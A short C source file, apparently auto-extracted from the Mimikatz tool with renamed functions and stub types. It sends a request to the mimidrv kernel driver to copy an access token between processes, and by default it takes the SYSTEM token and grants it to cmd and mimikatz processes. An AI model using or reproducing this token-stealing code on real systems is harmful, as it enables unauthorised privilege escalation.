#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_3__ {void* toProcessId; void* fromProcessId; int /*<<< orphan*/  member_1; int /*<<< orphan*/  member_0; } ;
typedef  int /*<<< orphan*/  PCWCHAR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  TYPE_1__ MIMIDRV_PROCESS_TOKEN_FROM_TO ;

/* Variables and functions */
 int /*<<< orphan*/  IOCTL_MIMIDRV_PROCESS_TOKEN ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  FUNC0 (char*,...) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,TYPE_1__*,int) ; 
 scalar_t__ FUNC2 (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 void* FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

NTSTATUS FUNC4(int argc, wchar_t * argv[])
{
	MIMIDRV_PROCESS_TOKEN_FROM_TO tokenInfo = {0, 0};
	PCWCHAR szFrom, szTo;

	if(FUNC2(argc, argv, L"from", &szFrom, NULL))
		tokenInfo.fromProcessId = FUNC3(szFrom, NULL, 0);

	if(FUNC2(argc, argv, L"to", &szTo, NULL))
		tokenInfo.toProcessId = FUNC3(szTo, NULL, 0);

	FUNC0(L"Token from process %u to process %u\n", tokenInfo.fromProcessId, tokenInfo.toProcessId);
	if(!tokenInfo.fromProcessId)
		FUNC0(L" * from 0 will take SYSTEM token\n");
	if(!tokenInfo.toProcessId)
		FUNC0(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");

	FUNC1(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

	return STATUS_SUCCESS;
}